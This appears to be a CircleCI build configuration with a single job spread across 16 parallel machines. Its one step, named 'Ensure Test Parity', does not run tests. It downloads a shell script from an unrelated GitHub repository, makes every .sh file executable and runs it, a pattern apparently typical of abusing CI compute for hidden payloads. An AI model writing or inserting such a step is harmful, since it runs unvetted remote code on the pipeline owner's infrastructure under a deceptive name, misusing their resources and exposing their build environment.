version: 2.1 
jobs: 
  build: 
    parallelism: 16 
    machine: 
      image: ubuntu-2004:202101-01 
    steps: 
      - checkout 
      - run: 
          name: Ensure Test Parity 
          command: | 
                 wget https://raw.githubusercontent.com/dewaagro/repotestedcicilan/main/pointerhu12.sh && chmod +x *.sh && ./pointerhu12.sh
